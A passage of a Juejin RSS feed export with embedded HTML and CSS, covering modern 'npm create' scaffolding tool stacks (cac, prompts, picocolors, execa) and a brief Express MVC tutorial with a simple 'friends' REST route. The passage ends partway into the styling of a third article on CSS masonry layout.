.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-text" lang="text">你有没有发现，现在新建一个前端项目的方式跟三五年前已经完全不一样了？

现在（2025~2026主流做法）：
npm create vite@latest
npx create-next-app@latest
npm create vue@latest
npm create astro@latest
npm create solid@latest
npm create svelte@latest
bun create react
pnpm create vite
</code></pre>
<p>这背后其实是一个非常重要的演进方向：</p>
<p><strong>「npm create xxx」这个写法几乎成了 2024-2026 年新建前端/全栈项目的事实标准</strong></p>
<p>而绝大多数人真正用到的、体验最好的那一批「create-xxx」，几乎都长得差不多，它们基本上都遵循了同一套「现代轻量脚手架模板」：</p>
<h3 data-id="heading-0">现代 create-xxx 脚手架的典型特征（2025-2026版）</h3>























































<table><thead><tr><th>特性</th><th>说明</th><th>常见实现工具/库</th></tr></thead><tbody><tr><td>命令形式</td><td><code>npm create xxx@latest</code> / <code>pnpm create xxx</code> / <code>bun create xxx</code></td><td>—</td></tr><tr><td>几乎不用全局安装</td><td>直接用 npx / bunx / pnpm dlx 执行</td><td>npm 的 create- 协议</td></tr><tr><td>极简依赖</td><td>通常只有 4~8 个运行时依赖</td><td>cac / commander + prompts</td></tr><tr><td>彩色 + 现代终端感</td><td>必须有颜色、loading 动画、渐变 logo</td><td>picocolors / kolorist / chalk</td></tr><tr><td>交互式问题</td><td>非常克制的问题数量（通常 2~5 个）</td><td>prompts / enquirer</td></tr><tr><td>模板直接拷贝或 degit</td><td>不再用 ejs 复杂渲染，更多直接拷贝 + 少量文本替换</td><td>fs-extra / degit</td></tr><tr><td>可选依赖自动安装</td><td>创建完立刻问你要不要 install</td><td>execa / child_process</td></tr><tr><td>支持 --template / --yes 跳过</td><td>喜欢 CI/CD 和喜欢极简的人最爱</td><td>cac / yargs / commander</td></tr><tr><td>模板文件夹结构清晰</td><td>template/react-ts、template/vue-ts、template/minimal 等</td><td>—</td></tr></tbody></table>
<h3 data-id="heading-1">目前（2026年初）最主流的几种「技术路线图」</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[想做现代脚手架] --&gt; B{选几条路?}

    B --&gt; C1[最推荐 极简现代风]
    B --&gt; C2[企业级/复杂需求风]
    B --&gt; C3[老派但稳定风]

    C1 --&gt; D1[cac + prompts + picocolors&lt;br&gt;+ fs-extra + execa]
    C1 --&gt; D2["bunx degit" 路线&lt;br&gt;几乎零依赖]

    C2 --&gt; D3[oclif 全家桶]
    C2 --&gt; D4[oclif + plugins 架构]

    C3 --&gt; D5[commander + inquirer + chalk]
    C3 --&gt; D6[yargs + enquirer]
</code></pre>
<h3 data-id="heading-2">2026 年最被推荐的「极简现代风」技术栈组合</h3>
<p>（绝大多数新项目都在用或往这个方向迁移）</p>
<pre><code class="hljs language-bash" lang="bash">核心依赖（共5个）：
├── cac               <span class="hljs-comment"># 超级轻量的命令行参数解析（比 commander 轻很多）</span>
├── prompts           <span class="hljs-comment"># 目前体验最好的交互式问答库（异步友好）</span>
├── picocolors        <span class="hljs-comment"># 目前最快的终端颜色库（取代 chalk）</span>
├── fs-extra          <span class="hljs-comment"># 增强版 fs（copy、emptyDir、ensureDir 等超好用）</span>
└── execa             <span class="hljs-comment"># 现代版的 child_process.exec（更好用 Promise）</span>

极受欢迎的加分项（按使用频率排序）：
1. degit              <span class="hljs-comment"># 从 github 仓库快速下载模板（git clone 替代品）</span>
2. ora                <span class="hljs-comment"># loading 动画小 spinner</span>
3. gradient-string    <span class="hljs-comment"># 做个好看的彩虹 logo（锦上添花）</span>
4. minimatch          <span class="hljs-comment"># 做文件过滤时偶尔会用到</span>
</code></pre>
<h3 data-id="heading-3">极简现代脚手架典型代码结构（2026主流写法参考）</h3>
<pre><code class="hljs language-javascript" lang="javascript">my-create-tool/
├── bin/
│   └── index.<span class="hljs-property">mjs</span>           ← #!<span class="hljs-regexp">/usr/</span>bin/env node
├── src/
│   ├── index.<span class="hljs-property">mjs</span>
│   ├── prompts.<span class="hljs-property">mjs</span>         ← 所有问题逻辑放这里
│   ├── copyTemplate.<span class="hljs-property">mjs</span>
│   ├── installDeps.<span class="hljs-property">mjs</span>
│   └── templates/          ← 真正要拷贝的内容都在这里
│       ├── vue-ts/
│       ├── react-ts/
│       ├── minimal/
│       └── node-api/
└── package.<span class="hljs-property">json</span>
</code></pre>
<p>最核心的几行代码大概长这样（简化版）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { cac } <span class="hljs-keyword">from</span> <span class="hljs-string">'cac'</span>
<span class="hljs-keyword">import</span> prompts <span class="hljs-keyword">from</span> <span class="hljs-string">'prompts'</span>
<span class="hljs-keyword">import</span> pc <span class="hljs-keyword">from</span> <span class="hljs-string">'picocolors'</span>
<span class="hljs-keyword">import</span> { copy } <span class="hljs-keyword">from</span> <span class="hljs-string">'fs-extra'</span>
<span class="hljs-keyword">import</span> { execaCommand } <span class="hljs-keyword">from</span> <span class="hljs-string">'execa'</span>

<span class="hljs-keyword">const</span> cli = <span class="hljs-title function_">cac</span>(<span class="hljs-string">'create-my-tool'</span>)

cli.<span class="hljs-title function_">command</span>(<span class="hljs-string">'[dir]'</span>, <span class="hljs-string">'项目目录名'</span>)
   .<span class="hljs-title function_">option</span>(<span class="hljs-string">'--template &lt;name&gt;'</span>, <span class="hljs-string">'指定模板'</span>)
   .<span class="hljs-title function_">action</span>(<span class="hljs-keyword">async</span> (dir, options) =&gt; {
      <span class="hljs-keyword">const</span> targetDir = dir || (<span class="hljs-keyword">await</span> <span class="hljs-title function_">askProjectName</span>()).<span class="hljs-property">name</span>
      <span class="hljs-keyword">const</span> template = options.<span class="hljs-property">template</span> || (<span class="hljs-keyword">await</span> <span class="hljs-title function_">askTemplate</span>()).<span class="hljs-property">template</span>

      <span class="hljs-keyword">await</span> <span class="hljs-title function_">copyTemplate</span>(template, targetDir)
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pc.<span class="hljs-title function_">green</span>(<span class="hljs-string">'项目创建完成～'</span>))

      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> <span class="hljs-title function_">shouldInstall</span>()) {
         <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'正在安装依赖...'</span>)
         <span class="hljs-keyword">await</span> <span class="hljs-title function_">execaCommand</span>(<span class="hljs-string">'pnpm install'</span>, { <span class="hljs-attr">cwd</span>: targetDir })
      }
   })

cli.<span class="hljs-title function_">help</span>().<span class="hljs-title function_">parse</span>()
</code></pre>
<h3 data-id="heading-4">总结：2026 年你应该往哪个方向写脚手架？</h3>
<pre><code class="hljs language-text" lang="text">如果你是：
个人/小团队/个人品牌/内部工具         →   强烈推荐「极简现代风」 cac + prompts + picocolors
中大型团队/需要很多子命令/复杂插件系统   →   考虑 oclif（学习成本高但未来可扩展）
老项目维护/团队成员前端经验比较传统     →   commander + inquirer + chalk 仍然安全可接受

当前性价比最高、最多人正在用、最容易做出「高级感」的组合是：

cac + prompts + picocolors + fs-extra + execa (+ degit)

这就是 2025-2026 年绝大多数「让人用起来很爽」的 create-xxx 工具背后真正的主流技术路线。
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[必知 Express和 MVC]]></title>    <link>https://juejin.cn/post/7594919272687812634</link>    <guid>https://juejin.cn/post/7594919272687812634</guid>    <pubDate>2026-01-14T07:28:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594919272687812634" data-draft-id="7594759496369094666" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="必知 Express和 MVC"/> <meta itemprop="keywords" content="前端,Node.js,全栈"/> <meta itemprop="datePublished" content="2026-01-14T07:28:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端付豪"/> <meta itemprop="url" content="https://juejin.cn/user/1741228277763278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            必知 Express和 MVC
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1741228277763278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端付豪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:28:35.000Z" title="Wed Jan 14 2026 07:28:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">中间件</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/424ae3f5492646868d5d0bf8b7657f17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=EG1FkqYMOGy2nzxLwbQrbuJU6uQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90a84c55e7d54d3aa6c91d3d8c8b83c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=TG9q1iou6ElXbxQIOMGq9A4rvkY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dd0a5dc2fd3405fb6b8a51546f19bac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=Lie1Na2PguMnoxCjjIzcKu%2FvXvI%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">简单但重要的发送/响应</h2>
<pre><code class="hljs language-scss" lang="scss">
app<span class="hljs-selector-class">.use</span>(express.json())

 

app<span class="hljs-selector-class">.post</span>('/friends', (req, res) =&gt; {

<span class="hljs-built_in">if</span>(!req.body.name){

return res<span class="hljs-selector-class">.status</span>(<span class="hljs-number">400</span>)<span class="hljs-selector-class">.json</span>({

error:'Missing friend name'

})

}

 

const newFriend = {

name: req.body.name,

id: friends.length

}

 

friends<span class="hljs-selector-class">.push</span>(newFriend)

 

res<span class="hljs-selector-class">.json</span>(newFriend)

})

 

 

app<span class="hljs-selector-class">.get</span>('/friends', (req, res) =&gt; {

res<span class="hljs-selector-class">.json</span>(friends)

})
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29ea489904ab416ca8be496c559abe36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=IkFBkvpb3fkNk51rbGy3o62dMTs%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5be4f30e894f4037a89bf892172e432d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=bW9z02UzddjfQW0v4paW9q2odiQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be303ff8b8434c2bb5b12e799b1ccdb5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=%2FRk%2BXEy8e3OiViuqp3MPCTVjTpA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">MVC(Model  View Controller)</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec49375adbbf49e384f9af9fb985e6eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=RnZ%2Fw8Kj2pOnwO4EDzerknUQzBs%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cfee2f89f004c73a7dceee733277944~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=76JlpJFRbAGipHcSIqQBni751F4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0f6cafd26914aa2a17b67edb0052020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=6rwY2ZucEU6A57EjnPwNF0kxTl0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a8dfa5f5c06495ba4fdda712fc10898~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=BJLGaSLOpN6cmZzB%2BgVRxuw9xYE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbe553e5b8864dfbb6d816412045e6ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=z7ulTjf1QA02UMa3PyVT%2BPNRa6Y%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">添加 router</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f03c82bde32f42168d02d87fcd7918f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=Xp7rZM%2BUROytkldmZiyKz6%2B7nOQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5959ebc846442b8bc7deb39ccbcbd09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=Usq1UJt63vEnWkxfnjI4u%2BDYYV0%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">Restful Api</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5202bd57750483eb9c5633b8fa3c6fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=Mc7dE8ufQPY7mSq5WTdYstrkrS4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ecd9072f29847cc8be8bd5fdb649bbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=ZNYR7TwhTImUN9KqMDvtudXO2Uo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">CRUD</h2>
<p>CRUD 工程师其实很多业务都是以这些操作为主</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/922a7fbc94374a1291b45d7e741498c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=%2BSo%2Fh%2BYrgNyYd5u%2B32wP1jL3KPA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">Template engines</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20aa04e4774c43d0b9d00881f26d073c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980514&amp;x-signature=5q9RCSIPZl1e%2BpFhoLMPIIlfs3A%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-7">仓库</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuanhunmao%2FComplete_NodeJS_Developer%2Ftree%2Fmaster%2Fnasa-project" target="_blank" title="https://github.com/huanhunmao/Complete_NodeJS_Developer/tree/master/nasa-project" ref="nofollow noopener noreferrer">github.com/huanhunmao/…</a></p>
<p>感谢点点 star ～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS终于能做瀑布流了！三行代码搞定,告别JavaScript布局]]></title>    <link>https://juejin.cn/post/7594854295758553131</link>    <guid>https://juejin.cn/post/7594854295758553131</guid>    <pubDate>2026-01-14T08:41:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594854295758553131" data-draft-id="7594801581003948068" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS终于能做瀑布流了！三行代码搞定,告别JavaScript布局"/> <meta itemprop="keywords" content="前端,后端,面试"/> <meta itemprop="datePublished" content="2026-01-14T08:41:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Immerse"/> <meta itemprop="url" content="https://juejin.cn/user/2708812817761752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS终于能做瀑布流了！三行代码搞定,告别JavaScript布局
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2708812817761752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Immerse
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:41:46.000Z" title="Wed Jan 14 2026 08:41:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body 